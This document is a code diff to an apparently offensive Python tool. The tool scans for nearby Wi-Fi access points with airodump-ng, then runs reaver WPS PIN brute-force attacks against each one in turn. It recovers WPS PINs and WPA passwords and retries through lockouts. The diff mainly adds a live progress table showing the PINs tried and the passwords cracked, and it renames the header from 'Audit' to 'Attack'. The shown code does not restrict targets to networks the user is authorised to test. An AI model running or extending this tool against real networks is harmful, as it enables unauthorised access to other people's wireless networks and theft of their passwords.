@@ -71,11 +71,13 @@ class AttackResult:
     bssid: str
     essid: str
     channel: str
-    status: str  # SUCCESS | FAILED | LOCKED
+    status: str  # SUCCESS | FAILED | LOCKED | PENDING | IN_PROGRESS
     wps_pin: str
     password: str
     time_spent: float
     retries: int
+    current_pin: str = "-"
+    pin_progress: int = 0  # Percentage 0-100
 
 
 # ---------------------------------------------------------
@@ -95,31 +97,33 @@ def check_monitor_mode(interface: str) -> bool:
 
 
 def run_airodump(interface: str, duration: int, prefix: str) -> str:
-    """Run airodump-ng for `duration` sec and save CSV with live output."""
+    """Run airodump-ng for `duration` sec and save CSV."""
     csv_path = f"{prefix}-01.csv"
 
-    print(f"[+] Running airodump-ng for {duration} seconds with live output...")
+    print(f"[+] Running airodump-ng for {duration} seconds...")
+
+    # Run airodump in background (it needs a TTY for display, so we suppress output)
     proc = subprocess.Popen(
         ["sudo", "timeout", str(duration),
          "airodump-ng", "--write", prefix, "--output-format", "csv", interface],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        universal_newlines=True
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
     )
 
-    # Display live output with progress
+    # Show progress bar while scanning
     start = time.time()
+    bar_width = 40
     while proc.poll() is None:
         elapsed = int(time.time() - start)
+        progress = min(elapsed / duration, 1)
+        filled = int(bar_width * progress)
+        bar = "█" * filled + "░" * (bar_width - filled)
+        percent = int(progress * 100)
+        print(f"\r[SCAN] |{bar}| {percent}% ({elapsed}/{duration}s)", end="", flush=True)
 
-        # Read and display output
-        line = proc.stdout.readline()
-        if line:
-            print(line.rstrip())
-
-        # Check if time is up
         if elapsed >= duration:
             break
+        time.sleep(0.5)
 
     proc.wait()
     print("\n[+] Finished airodump scan.")
@@ -236,34 +240,75 @@ def wait_with_countdown(seconds: int, reason: str = "WPS lock detected"):
     print("\n[+] Resuming attack...")
 
 
-def update_progress_header(stats: Dict):
-    """Clear screen and redraw progress header with current stats."""
-    # Clear screen (ANSI escape code)
-    print("\033[2J\033[H", end="")
+def update_targets_table(results: List[AttackResult], stats: Dict):
+    """
+    Update and display the fixed targets table at top of screen.
+    This shows all targets with their current status and progress.
+    """
+    # Move cursor to home position and clear screen
+    print("\033[2J\033[H", end="", flush=True)
 
-    print("=" * 50)
-    print("=== WiFi WPS Audit Progress ===")
-    print("=" * 50)
+    # Header
+    print("=" * 120)
+    print("=== WiFi WPS Attack Progress ===")
+    print("=" * 120)
 
     total = stats['total']
     completed = stats['completed']
     percent = int((completed / total) * 100) if total > 0 else 0
 
-    print(f"Progress: [{completed}/{total}] ({percent}%)")
-    print(f"Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']}")
+    print(f"Overall Progress: [{completed}/{total}] ({percent}%) | Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']}")
+    print("=" * 120)
 
-    if stats['current_target']:
-        target = stats['current_target']
-        idx = stats['current_index']
-        print(f"Current Target: [{idx}/{total}] {target.essid} ({target.bssid})")
+    # Table header
+    print(f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'Session':<12} | {'Result/Progress':<55}")
+    print("-" * 120)
 
-    print("=" * 50)
-    print()
+    # Table rows
+    for result in results:
+        num = f"{result.target_num}"
+        essid = result.essid[:20]
+        bssid = result.bssid
+
+        # Session status
+        if result.status == "PENDING":
+            session = "Pending"
+        elif result.status == "IN_PROGRESS":
+            session = "In Progress"
+        elif result.status in ["SUCCESS", "FAILED", "LOCKED"]:
+            session = "Completed"
+        else:
+            session = result.status
+
+        # Result/Progress column
+        if result.status == "PENDING":
+            progress = "-"
+        elif result.status == "IN_PROGRESS":
+            if result.current_pin != "-":
+                progress = f"Testing PIN: {result.current_pin} | Progress: {result.pin_progress}%"
+            else:
+                progress = "Initializing attack..."
+        elif result.status == "SUCCESS":
+            progress = f"SUCCESS | PIN: {result.wps_pin} | Pass: {result.password}"
+        elif result.status == "LOCKED":
+            progress = f"LOCKED (WPS rate limiting detected, max retries reached)"
+        elif result.status == "FAILED":
+            progress = f"FAILED (no WPS PIN found)"
+        else:
+            progress = result.status
+
+        print(f"{num:<3} | {essid:<20} | {bssid:<17} | {session:<12} | {progress:<55}")
+
+    print("=" * 120)
+    print("\n=== Live Reaver Output ===\n")
 
 
-def run_reaver_attack(target: AccessPoint, interface: str, max_retries: int = 10) -> AttackResult:
+def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackResult,
+                      stats: Dict, all_results: List[AttackResult],
+                      max_retries: int = 10, verbose: bool = False) -> AttackResult:
     """
     Run reaver against a single target with lock detection/retry logic.
+    Updates result_obj in real-time for live progress display.
     """
     start_time = time.time()
     retry_count = 0
@@ -301,6 +346,8 @@ def run_reaver_attack(target: AccessPoint, interface: str, max_retries: int = 10
             password = None
             locked = False
             association_failed = False
+            pins_tried = 0
+            total_pins = 11000  # Approximate total WPS PINs to try
 
             # Monitor output
             while True:
@@ -309,20 +356,50 @@ def run_reaver_attack(target: AccessPoint, interface: str, max_retries: int = 10
                     break
 
                 if line:
-                    print(line.rstrip())
+                    # Determine if we should print this line based on verbose mode
+                    should_print = verbose
+
+                    # Always print important lines regardless of verbose mode
+                    important_keywords = [
+                        "[+]", "[!]", "WPS PIN", "WPA PSK", "WARNING",
+                        "Failed to associate", "rate limiting", "Detected AP"
+                    ]
+
+                    if any(keyword in line for keyword in important_keywords):
+                        should_print = True
+
+                    if should_print:
+                        print(line.rstrip())
+
+                    # Extract current PIN being tested
+                    pin_match = re.search(r"Trying pin[:\s]+['\"]?(\d{8})['\"]?", line, re.IGNORECASE)
+                    if pin_match:
+                        current_pin = pin_match.group(1)
+                        result_obj.current_pin = current_pin
+                        pins_tried += 1
+                        result_obj.pin_progress = min(int((pins_tried / total_pins) * 100), 99)
+
+                        # Update table every 10 PINs to avoid excessive redraws
+                        if pins_tried % 10 == 0:
+                            update_targets_table(all_results, stats)
 
                     # Check for success
                     if "[+] WPS PIN:" in line:
                         match = re.search(r"WPS PIN: '(\d+)'", line)
                         if match:
                             wps_pin = match.group(1)
+                            result_obj.wps_pin = wps_pin
+                            result_obj.pin_progress = 100
                             last_progress_time = time.time()
+                            update_targets_table(all_results, stats)
 
                     if "[+] WPA PSK:" in line:
                         match = re.search(r"WPA PSK: '(.+)'", line)
                         if match:
                             password = match.group(1)
+                            result_obj.password = password
                             last_progress_time = time.time()
+                            update_targets_table(all_results, stats)
 
                     # Check for lock
                     if detect_wps_lock(line):
@@ -351,17 +428,15 @@ def run_reaver_attack(target: AccessPoint, interface: str, max_retries: int = 10
                 print(f"[+] SUCCESS! WPS PIN: {wps_pin}")
                 if password:
                     print(f"[+] Password: {password}")
-                return AttackResult(
-                    target_num=0,  # Will be set by caller
-                    bssid=target.bssid,
-                    essid=target.essid,
-                    channel=target.channel,
-                    status="SUCCESS",
-                    wps_pin=wps_pin,
-                    password=password or "-",
-                    time_spent=elapsed,
-                    retries=retry_count
-                )
+
+                result_obj.status = "SUCCESS"
+                result_obj.wps_pin = wps_pin
+                result_obj.password = password or "-"
+                result_obj.time_spent = elapsed
+                result_obj.retries = retry_count
+                result_obj.pin_progress = 100
+                update_targets_table(all_results, stats)
+                return result_obj
 
             # Handle association failure - switch modes
             if association_failed and use_no_association:
@@ -378,17 +453,13 @@ def run_reaver_attack(target: AccessPoint, interface: str, max_retries: int = 10
                 else:
                     print(f"[!] Max retries ({max_retries}) reached, target locked")
                     elapsed = time.time() - start_time
-                    return AttackResult(
-                        target_num=0,
-                        bssid=target.bssid,
-                        essid=target.essid,
-                        channel=target.channel,
-                        status="LOCKED",
-                        wps_pin="-",
-                        password="-",
-                        time_spent=elapsed,
-                        retries=retry_count
-                    )
+                    result_obj.status = "LOCKED"
+                    result_obj.wps_pin = "-"
+                    result_obj.password = "-"
+                    result_obj.time_spent = elapsed
+                    result_obj.retries = retry_count
+                    update_targets_table(all_results, stats)
+                    return result_obj
             else:
                 # Failed for other reasons
                 retry_count += 1
@@ -404,17 +475,13 @@ def run_reaver_attack(target: AccessPoint, interface: str, max_retries: int = 10
 
     # Failed after all retries
     elapsed = time.time() - start_time
-    return AttackResult(
-        target_num=0,
-        bssid=target.bssid,
-        essid=target.essid,
-        channel=target.channel,
-        status="FAILED",
-        wps_pin="-",
-        password="-",
-        time_spent=elapsed,
-        retries=retry_count
-    )
+    result_obj.status = "FAILED"
+    result_obj.wps_pin = "-"
+    result_obj.password = "-"
+    result_obj.time_spent = elapsed
+    result_obj.retries = retry_count
+    update_targets_table(all_results, stats)
+    return result_obj
 
 
 def print_table(aps: List[AccessPoint]):
@@ -538,6 +605,11 @@ def main():
         action="store_true",
         help="passive scan only, no WPS attacks (default: active mode)"
     )
+    parser.add_argument(
+        "--verbose",
+        action="store_true",
+        help="show all reaver output lines (default: important lines only)"
+    )
     args = parser.parse_args()
 
     # Check if interface is in monitor mode
@@ -596,17 +668,44 @@ def main():
         'current_index': 0
     }
 
+    # Initialize all results as PENDING
     results = []
+    for idx, target in enumerate(targets, 1):
+        results.append(AttackResult(
+            target_num=idx,
+            bssid=target.bssid,
+            essid=target.essid,
+            channel=target.channel,
+            status="PENDING",
+            wps_pin="-",
+            password="-",
+            time_spent=0.0,
+            retries=0
+        ))
+
+    # Display initial table
+    update_targets_table(results, stats)
+    time.sleep(2)  # Give user time to see the initial state
 
     # Attack each target
     for idx, target in enumerate(targets, 1):
         stats['current_target'] = target
         stats['current_index'] = idx
-        update_progress_header(stats)
 
-        # Run attack
-        result = run_reaver_attack(target, args.interface, max_retries=10)
-        result.target_num = idx
+        # Mark current target as IN_PROGRESS
+        results[idx - 1].status = "IN_PROGRESS"
+        update_targets_table(results, stats)
+
+        # Run attack (pass the result object for live updates)
+        result = run_reaver_attack(
+            target,
+            args.interface,
+            results[idx - 1],
+            stats,
+            results,
+            max_retries=10,
+            verbose=args.verbose
+        )
 
         # Update stats
         stats['completed'] += 1
@@ -617,7 +716,8 @@ def main():
         else:
             stats['failed'] += 1
 
-        results.append(result)
+        # Final table update for this target
+        update_targets_table(results, stats)
 
     # Display final results
     print_results_table(results)
